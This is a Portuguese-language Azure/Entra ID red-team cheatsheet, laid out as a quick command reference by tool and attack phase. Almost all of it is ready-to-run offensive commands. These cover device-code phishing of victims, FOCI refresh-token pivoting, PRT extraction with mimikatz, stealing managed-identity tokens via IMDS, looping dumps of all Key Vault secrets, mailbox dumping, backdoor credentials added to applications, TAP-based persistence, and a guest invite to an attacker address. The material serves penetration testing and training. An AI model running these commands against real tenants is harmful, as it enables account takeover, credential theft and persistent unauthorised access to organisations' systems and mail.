---
layout: cyber
section: active-directory
title: "Azure Red Team Cheatsheet — Referência Rápida de Comandos"
---

# 07 - Azure Red Team Cheatsheet — Referência Rápida de Comandos

> Referência consolidada para operações ofensivas em Azure/Entra ID.
> Organizada por ferramenta e fase de ataque.

---

## Az CLI — Autenticação e Contexto

```bash
# Login interativo (browser)
az login

# Login com Device Code (útil para phishing / terminal sem browser)
az login --use-device-code

# Login como Service Principal com senha
az login --service-principal -u <CLIENT_ID> -p <CLIENT_SECRET> --tenant <TENANT_ID>

# Login como Service Principal com certificado
az login --service-principal -u <CLIENT_ID> --certificate /path/cert.pem --tenant <TENANT_ID>

# Login com Managed Identity (dentro de VM Azure)
az login --identity
az login --identity --username <CLIENT_ID>   # Managed Identity específica (user-assigned)

# Ver conta atual
az account show

# Listar todas as subscriptions acessíveis
az account list --output table

# Mudar de subscription
az account set --subscription <SUBSCRIPTION_ID>

# Obter access token para recurso específico
az account get-access-token
az account get-access-token --resource https://graph.microsoft.com/
az account get-access-token --resource https://vault.azure.net/
az account get-access-token --resource https://storage.azure.com/

# Ver tenant atual
az account tenant list
```

---

## Az CLI — Enumeração de Recursos ARM

```bash
# Listar todos os recursos da subscription
az resource list --output table
az resource list --query "[].{Name:name, Type:type, RG:resourceGroup}" --output table

# Listar por tipo de recurso
az resource list --resource-type Microsoft.Compute/virtualMachines --output table
az resource list --resource-type Microsoft.KeyVault/vaults --output table
az resource list --resource-type Microsoft.Storage/storageAccounts --output table
az resource list --resource-type Microsoft.Web/sites --output table

# Listar resource groups
az group list --output table

# Listar VMs
az vm list --output table
az vm list --show-details --query "[].{Name:name, IP:publicIps, Status:powerState}" --output table

# Detalhes de uma VM
az vm show -g <RESOURCE_GROUP> -n <VM_NAME>

# Listar storage accounts
az storage account list --output table

# Listar Key Vaults
az keyvault list --output table

# Listar App Services / Function Apps
az webapp list --output table
az functionapp list --output table

# Listar AKS clusters
az aks list --output table

# Listar App Registrations (requer permissão Graph)
az ad app list --output table
az ad app list --query "[].{AppId:appId, Name:displayName}" --output table

# Listar Service Principals
az ad sp list --output table
az ad sp list --query "[].{AppId:appId, Name:displayName}" --output table

# Detalhes de um SP específico
az ad sp show --id <APP_ID_OR_OBJECT_ID>
```

---

## Az CLI — RBAC e Permissões

```bash
# Listar role assignments da subscription atual
az role assignment list --all --output table
az role assignment list --all --query "[].{Principal:principalName, Role:roleDefinitionName, Scope:scope}" --output table

# Role assignments de um usuário/SP específico
az role assignment list --assignee <USER_OR_SP_ID> --all --output table

# Role assignments no escopo de um resource group
az role assignment list --resource-group <RG_NAME> --output table

# Listar definições de roles (built-in e custom)
az role definition list --output table
az role definition list --custom-role-only true --output table

# Verificar permissões efetivas do usuário atual em um recurso
az resource show --ids <RESOURCE_ID>

# Listar roles que podem ser assignadas a um escopo
az role definition list --scope /subscriptions/<SUB_ID>

# Adicionar role assignment (se tiver permissão)
az role assignment create \
  --assignee <OBJECT_ID> \
  --role "Contributor" \
  --scope /subscriptions/<SUB_ID>

# Verificar quem tem Owner/Contributor na subscription
az role assignment list --all \
  --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor']" \
  --output table
```

---

## Az CLI — VMs e Execução de Comandos

```bash
# Executar comando em VM via Run Command (requer Microsoft.Compute/virtualMachines/runCommand/action)
az vm run-command invoke \
  --resource-group <RG> \
  --name <VM_NAME> \
  --command-id RunShellScript \
  --scripts "id; whoami; cat /etc/passwd"

# Windows
az vm run-command invoke \
  --resource-group <RG> \
  --name <VM_NAME> \
  --command-id RunPowerShellScript \
  --scripts "whoami; Get-Process"

# Listar extensões de VM (podem conter scripts)
az vm extension list --resource-group <RG> --vm-name <VM_NAME> --output table

# Reset de senha de admin via extensão (se tiver permissão)
az vm user update \
  --resource-group <RG> \
  --name <VM_NAME> \
  --username azureuser \
  --password "NewP@ssw0rd123"

# Abrir porta via NSG (se tiver permissão)
az network nsg rule create \
  --resource-group <RG> \
  --nsg-name <NSG_NAME> \
  --name AllowRDP \
  --priority 100 \
  --destination-port-ranges 3389 \
  --access Allow
```

---

## Microsoft Graph — Mg-Graph PowerShell

```powershell
# Instalar e importar
Install-Module Microsoft.Graph -Scope CurrentUser
Import-Module Microsoft.Graph

# Conectar com diferentes escopos
Connect-MgGraph -Scopes "User.Read.All","Group.Read.All","Directory.Read.All"

# Conectar com access token existente
$token = "eyJ0..."
Connect-MgGraph -AccessToken ($token | ConvertTo-SecureString -AsPlainText -Force)

# Conectar com Service Principal
Connect-MgGraph -ClientId <CLIENT_ID> -TenantId <TENANT_ID> -ClientSecret <SECRET>

# Ver identidade atual
Get-MgContext

# Desconectar
Disconnect-MgGraph

# --- USUÁRIOS ---
# Listar todos os usuários
Get-MgUser -All | Select DisplayName, UserPrincipalName, Id

# Detalhes de um usuário
Get-MgUser -UserId "user@contoso.com"

# Buscar usuários com propriedades específicas
Get-MgUser -Filter "startsWith(userPrincipalName,'admin')" -All

# Membros de grupo de administradores
Get-MgGroupMember -GroupId <GROUP_ID> -All | Select Id

# --- GRUPOS ---
Get-MgGroup -All | Select DisplayName, Id
Get-MgGroup -Filter "startsWith(displayName,'Admin')"

# --- SERVICE PRINCIPALS ---
Get-MgServicePrincipal -All | Select DisplayName, AppId, Id
Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId <SP_ID>

# --- ROLES ENTRA ID ---
# Listar role assignments no Entra ID
Get-MgDirectoryRole -All | Select DisplayName, Id
Get-MgDirectoryRoleMember -DirectoryRoleId <ROLE_ID> -All

# Roles de um usuário específico
Get-MgUserTransitiveMemberOf -UserId <USER_ID> | Where {$_.AdditionalProperties['@odata.type'] -eq '#microsoft.graph.directoryRole'}

# --- APP REGISTRATIONS ---
Get-MgApplication -All | Select DisplayName, AppId, Id
Get-MgApplicationPassword -ApplicationId <APP_OBJECT_ID>  # Listar client secrets (sem ver o valor)

# Adicionar secret a uma aplicação (se tiver permissão)
Add-MgApplicationPassword -ApplicationId <APP_OBJECT_ID> -PasswordCredential @{DisplayName="pwned"}

# --- CONDITIONAL ACCESS ---
# Listar CAPs (requer Policy.Read.All ou roles específicas)
Get-MgIdentityConditionalAccessPolicy -All | Select DisplayName, State, Id

# Detalhes de uma CAP
Get-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId <POLICY_ID>

# --- ENUMERAÇÃO DE PERMISSÕES DE APLICAÇÃO ---
# App role assignments de um SP
Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId <SP_ID> -All

# OAuth2 permission grants (delegated)
Get-MgServicePrincipalOauth2PermissionGrant -ServicePrincipalId <SP_ID>
```

---

## Azure REST API — Tokens e Enumeração

### Obter Token via ROPC (Resource Owner Password Credential)

```bash
# Token para ARM (management.azure.com)
curl -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
  -d "grant_type=password" \
  -d "client_id=<CLIENT_ID>" \
  -d "username=<USER>" \
  -d "password=<PASS>" \
  -d "scope=https://management.azure.com/.default"

# Token para Microsoft Graph
curl -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
  -d "grant_type=password" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  -d "username=<USER>" \
  -d "password=<PASS>" \
  -d "scope=https://graph.microsoft.com/.default"
```

### Device Code Flow

```bash
# Passo 1: Solicitar device code
curl -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/devicecode" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  -d "scope=https://graph.microsoft.com/.default offline_access"

# Resposta inclui: device_code, user_code, verification_uri
# Apresentar user_code à vítima para ela autenticar em https://microsoft.com/devicelogin

# Passo 2: Fazer polling até usuário autenticar
curl -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  -d "device_code=<DEVICE_CODE>"
```

### Refresh Token → Novo Access Token

```bash
# Usar refresh token para obter access token para qualquer recurso
curl -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  -d "refresh_token=<REFRESH_TOKEN>" \
  -d "scope=https://management.azure.com/.default"

# FOCI: usar refresh token de um app para obter token de outro app da família
curl -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token" \
  -d "client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264" \  # Teams client ID
  -d "refresh_token=<FRT_FROM_ANOTHER_APP>" \
  -d "scope=https://graph.microsoft.com/.default"
```

### Chamadas REST Diretas

```bash
TOKEN="<ACCESS_TOKEN>"

# Listar subscriptions
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Listar resource groups
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/resourceGroups?api-version=2021-04-01"

# Listar todos os recursos
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/resources?api-version=2021-04-01"

# Listar role assignments
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"

# Graph API — listar usuários
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users"

# Graph API — usuário atual
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me"
```

---

## Entra ID — Ataques de Identidade

### Device Code Phishing com TokenTacticsV2

```powershell
# Instalar TokenTacticsV2
Import-Module .\TokenTactics.psd1

# Iniciar device code phishing para MSGraph
Get-AzureToken -Client MSGraph

# Para ARM
Get-AzureToken -Client AzureCoreManagement

# Após capturar o token, usar FOCI para obter tokens de outros apps
Invoke-RefreshToMSGraphToken -domain contoso.com -refreshToken <FRT>
Invoke-RefreshToAzureCoreManagementToken -domain contoso.com -refreshToken <FRT>
Invoke-RefreshToOutlookToken -domain contoso.com -refreshToken <FRT>
Invoke-RefreshToSharePointToken -domain contoso.com -refreshToken <FRT>

# Dump de emails
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken -mailFolder inbox
```

### FOCI — Family of Client IDs

```bash
# Client IDs da família Microsoft (seleção)
# Azure CLI:          04b07795-8ddb-461a-bbee-02f9e1bf7b46
# Microsoft Office:  d3590ed6-52b3-4102-aeff-aad2292ab01c
# Microsoft Teams:   1fec8e78-bce4-4aaf-ab1b-5451cc387264
# Azure PowerShell:  1950a258-227b-4e31-a9cf-717495945fc2
# OneDrive:          ab9b8c07-8f02-4f72-87fa-80105867a763

# Usar FRT de Az CLI para obter token de Office 365
curl -X POST "https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
  -d "refresh_token=<FAMILY_REFRESH_TOKEN>" \
  -d "scope=https://graph.microsoft.com/.default"
```

### PRT (Primary Refresh Token) — Abuso

```powershell
# Extrair PRT de máquina Windows joined (requer privilégio local)
# Usando ROADtoken (em contexto de usuário logado)
.\ROADtoken.exe

# Usando BrowserShot / TokenBroker no contexto do usuário
# Via mimikatz (requer SYSTEM ou Debug)
sekurlsa::cloudap    # Extrai PRT e session key

# Converter PRT em access token usando AADInternals
Import-Module AADInternals
# (Requer contexto de usuário com PRT válido na máquina)
Get-AADIntUserPRTToken
```

### Temporary Access Pass (TAP) — Criação e Abuso

```powershell
# Criar TAP para um usuário (requer papel de Authentication Administrator)
$params = @{
    isUsableOnce = $false
    lifetimeInMinutes = 60
}
New-MgUserAuthenticationTemporaryAccessPassMethod -UserId "victim@contoso.com" -BodyParameter $params

# Via Graph API REST
curl -X POST "https://graph.microsoft.com/v1.0/users/<USER_ID>/authentication/temporaryAccessPassMethods" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"isUsableOnce": false, "lifetimeInMinutes": 60}'

# O TAP satisfaz MFA em CAPs — pode ser usado para registrar novo método de autenticação
# (chave FIDO2, Microsoft Authenticator, etc.) e manter acesso persistente
```

---

## Managed Identity — Abuso

### Acesso via IMDS (Instance Metadata Service)

```bash
# Obter token para ARM (dentro de VM Azure)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -m json.tool

# Para Microsoft Graph
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Para Key Vault
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"

# Para Storage
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

# Metadados da instância (sem token necessário)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  | python3 -m json.tool

# Verificar identidades disponíveis
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/info?api-version=2021-02-01"
```

### Abuso de MI em App Services e Functions

```bash
# Variável de ambiente em App Service/Function App
echo $IDENTITY_ENDPOINT   # URL do endpoint de identidade
echo $IDENTITY_HEADER     # Token de segurança necessário

# Obter token via endpoint específico de App Service
curl -s "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"

# Em Azure Container Instances
curl -s "$MSI_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "Secret: $MSI_SECRET"
```

---

## Operações com Tokens JWT

### Decodificar JWT (sem validação de assinatura)

```bash
# Decodificar header e payload
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsI..."

# Header
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool

# Payload (claims)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Extrair campos específicos
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
import sys, json
claims = json.load(sys.stdin)
print('UPN:', claims.get('upn', claims.get('unique_name', 'N/A')))
print('AppId:', claims.get('appid', 'N/A'))
print('Roles:', claims.get('roles', []))
print('Scp:', claims.get('scp', 'N/A'))
print('Exp:', claims.get('exp', 'N/A'))
print('Aud:', claims.get('aud', 'N/A'))
print('Tenant:', claims.get('tid', 'N/A'))
"

# Verificar validade do token
python3 -c "
import sys, json, time, base64
token = sys.argv[1]
payload = json.loads(base64.b64decode(token.split('.')[1] + '=='))
exp = payload.get('exp', 0)
print(f'Expira em: {time.ctime(exp)} (daqui {int(exp-time.time())}s)')
" "$TOKEN"
```

### JWT Assertion — Usando Certificado para Obter Token

```bash
# Se você tem acesso a um Key Vault com certificado de uma aplicação
# e a permissão Key Vault JWT Officer (sign, não export):

# Passo 1: Criar JWT header + payload
HEADER=$(echo -n '{"alg":"RS256","typ":"JWT","x5t":"<CERT_THUMBPRINT>"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
NOW=$(date +%s)
EXP=$((NOW + 300))
PAYLOAD=$(echo -n "{\"iss\":\"<CLIENT_ID>\",\"sub\":\"<CLIENT_ID>\",\"aud\":\"https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/token\",\"jti\":\"$(uuidgen)\",\"nbf\":$NOW,\"exp\":$EXP}" | base64 -w0 | tr '+/' '-_' | tr -d '=')

# Passo 2: Assinar com chave do Key Vault
SIGN_INPUT="$HEADER.$PAYLOAD"
SIGNATURE=$(echo -n "$SIGN_INPUT" | openssl dgst -sha256 -binary | \
  az keyvault key sign --vault-name <VAULT> --name <KEY> --algorithm RS256 \
  --value @- --query result -o tsv | tr '+/' '-_' | tr -d '=')

JWT="$SIGN_INPUT.$SIGNATURE"

# Passo 3: Usar JWT assertion para obter access token
curl -X POST "https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=<CLIENT_ID>" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$JWT" \
  -d "scope=https://management.azure.com/.default"
```

---

## Key Vault — Acesso e Extração

```bash
# Listar Key Vaults na subscription
az keyvault list --output table

# Listar secrets em um vault (requer Key Vault Secrets User ou Reader no vault)
az keyvault secret list --vault-name <VAULT_NAME> --output table

# Obter valor de um secret
az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME>
az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME> --query value -o tsv

# Dump de todos os secrets de um vault
az keyvault secret list --vault-name <VAULT_NAME> --query "[].name" -o tsv | \
  while read name; do
    echo "=== $name ==="
    az keyvault secret show --vault-name <VAULT_NAME> --name $name --query value -o tsv
  done

# Listar chaves (keys)
az keyvault key list --vault-name <VAULT_NAME> --output table

# Listar certificados
az keyvault certificate list --vault-name <VAULT_NAME> --output table

# Download de certificado (inclui chave privada se policy permitir)
az keyvault certificate download --vault-name <VAULT_NAME> --name <CERT_NAME> --file cert.pem

# Via REST API com token
curl -H "Authorization: Bearer $TOKEN" \
  "https://<VAULT_NAME>.vault.azure.net/secrets?api-version=7.4"

curl -H "Authorization: Bearer $TOKEN" \
  "https://<VAULT_NAME>.vault.azure.net/secrets/<SECRET_NAME>?api-version=7.4"

# Verificar access policies de um vault
az keyvault show --name <VAULT_NAME> --query properties.accessPolicies

# Verificar RBAC assignments no vault
az role assignment list --scope /subscriptions/<SUB>/resourceGroups/<RG>/providers/Microsoft.KeyVault/vaults/<VAULT> --output table
```

---

## AzureHound — Coleta para BloodHound

```bash
# Autenticar e coletar todos os dados Azure
azurehound -u <USER> -p <PASS> -t <TENANT> list --services all -o azurehound_output.json

# Com refresh token
azurehound -r <REFRESH_TOKEN> -t <TENANT> list --services all -o output.json

# Serviços específicos
azurehound -u <USER> -p <PASS> -t <TENANT> list \
  --services az-role-assignments,az-subscriptions,az-resource-groups,az-key-vaults

# Com MFA — usar refresh token obtido via Device Code
# Passo 1: obter token via device code
azurehound -t <TENANT> auth devicecode
# Passo 2: usar refresh token salvo
azurehound -r $(cat ~/.config/azurehound/token.json | jq -r .refresh_token) \
  -t <TENANT> list --services all -o output.json

# Importar no BloodHound CE
# Upload do arquivo JSON na interface web do BloodHound CE
```

---

## ROADtools — Enumeração e Análise

```bash
# Instalar
pip install roadtools roadlib

# Autenticar com Device Code
roadrecon auth --device-code --tenant <TENANT>

# Autenticar com credenciais
roadrecon auth -u <USER> -p <PASS> --tenant <TENANT>

# Coletar dados do tenant
roadrecon gather

# Iniciar interface web (porta 5000)
roadrecon gui

# Plugins de análise
roadrecon plugin road-tools-plugins
roadrecon plugin bloodhound  # Exportar para BloodHound

# roadtx — manipulação de tokens
# Obter token via Device Code
roadtx gettokens --device-code -c <CLIENT_ID> -t <TENANT> -r https://graph.microsoft.com/

# FOCI abuse com roadtx
roadtx gettokens --refresh-token <RT> -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46 -r https://graph.microsoft.com/

# Enumerar CAPs (via endpoint interno deprecado)
roadtx caPolicies
```

---

## AADInternals — Ataques Avançados Entra ID

```powershell
# Instalar
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals

# Reconhecimento sem autenticação
Invoke-AADIntReconAsOutsider -DomainName contoso.com
Get-AADIntTenantID -Domain contoso.com
Get-AADIntOpenIDConfiguration -Domain contoso.com

# Obter token via Device Code Phishing
$token = Get-AADIntAccessTokenForMSGraph -Credentials (Get-Credential) -SaveToCache
# Ou Device Code
$token = Get-AADIntAccessTokenForMSGraph -DeviceCode -SaveToCache

# Enumerar usuários, grupos, roles
Get-AADIntUsers | Select UserPrincipalName, DisplayName
Get-AADIntGroups | Select DisplayName, Id
Get-AADIntRoleMembers | Select RoleName, UserPrincipalName

# Criar Backdoor (requires Global Admin)
# Adicionar credencial a aplicação existente
Add-AADIntApplicationCredential -AppId <APP_ID> -Description "Backup"

# Guest invite abuse
Invoke-AADIntGuestInvitation -EmailAddress "attacker@evil.com" -Message "Hello!"

# Dump de sync secrets (requer AD Sync permissions)
Get-AADIntSyncCredentials
Export-AADIntADFSCertificates

# Pass-the-PRT (requer contexto correto na máquina Windows)
Get-AADIntUserPRTToken | Set-AADIntUserPRTToken
```

---

## Stormspotter — Visualização de Ataque

```bash
# Coletar dados (backend Python)
cd stormspotter/stormcollector
python3 sscollector.py --sp-auth \
  --client-id <CLIENT_ID> \
  --client-secret <CLIENT_SECRET> \
  --tenant-id <TENANT_ID>

# Iniciar backend e UI
cd stormspotter
docker-compose up
# Acessa http://localhost:9091 com Neo4j browser
# Usuario: neo4j, Senha: BloodHound (padrão)
```

---

## MicroBurst — Enumeração Azure em PowerShell

```powershell
Import-Module MicroBurst.psm1

# Enumerar recursos sem autenticação
Invoke-EnumerateAzureBlobs -Base contoso
Invoke-EnumerateAzureSubDomains -Base contoso -Verbose

# Com autenticação
Get-AzureDomainInfo -folder MicroBurst
Invoke-EnumerateAzureBlobs -Base <BASE_NAME>

# Verificar storage accounts públicos
Invoke-EnumerateAzureBlobs -Base contoso -outputFile blobs.txt

# Coletar informações de runbooks, automation accounts
Get-AzureRunbooks
Get-AzurePasswords
```

---

## Comandos de Referência Rápida — Scenarios Comuns

### Scenario 1: Initial Access via Service Principal Vazado

```bash
az login --service-principal -u $CLIENT_ID -p $CLIENT_SECRET --tenant $TENANT_ID
az account show
az role assignment list --assignee $CLIENT_ID --all --output table
az resource list --output table
```

### Scenario 2: Lateral Movement via Managed Identity (VM)

```bash
# Dentro da VM comprometida
TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
az login --identity
az role assignment list --assignee $(az account show --query id -o tsv) --all
az keyvault list --output table
```

### Scenario 3: Privilege Escalation via Key Vault Certificate

```bash
# Listar certificados no vault
az keyvault certificate list --vault-name $VAULT --output table

# Verificar apps que usam o certificado
az ad app list --query "[?keyCredentials[?customKeyIdentifier=='<THUMBPRINT>']]"

# Download do certificado se policy permitir
az keyvault certificate download --vault-name $VAULT --name $CERT --file cert.pfx --encoding PEM

# Usar certificado para autenticar como aplicação
az login --service-principal -u $CLIENT_ID --certificate cert.pem --tenant $TENANT_ID
```

### Scenario 4: FOCI Token Pivoting

```bash
# Tem refresh token do Az CLI (ARM scope)
# Usar para obter token do Graph
curl -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&refresh_token=$FRT&scope=https://graph.microsoft.com/.default"

# Usar token do Graph para ler emails
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/users/$TARGET_USER/messages?\$top=10"
```

### Scenario 5: Conditional Access Enumeration

```bash
# Via AADGraph deprecated endpoint (qualquer usuário autenticado)
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.windows.net/myorganization/conditionalAccessPolicies?api-version=1.61-internal"

# Via MS Graph (requer Policy.Read.ConditionalAccess)
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"
```

---

## Referências e Ferramentas

| Ferramenta | Repositório | Uso Principal |
|-----------|-------------|---------------|
| AzureHound | github.com/BloodHoundAD/AzureHound | Coleta para BloodHound |
| ROADtools | github.com/dirkjanm/ROADtools | Enum e análise de tenant |
| AADInternals | github.com/Gerenios/AADInternals | Ataques avançados Entra ID |
| TokenTacticsV2 | github.com/f-bader/TokenTacticsV2 | Device code phishing, FOCI |
| MicroBurst | github.com/NetSPI/MicroBurst | Enum PowerShell |
| Stormspotter | github.com/Azure/Stormspotter | Visualização de ataque |
| PowerZure | github.com/hausec/PowerZure | Pós-exploração PowerShell |
| ScoutSuite | github.com/nccgroup/ScoutSuite | Auditoria multi-cloud |
| BARK | github.com/BloodHoundAD/BARK | BloodHound Attack Research Kit |
| Pester/PurpleKnight | github.com/secureworks/PurpleKnight | Assessment AD/Entra |
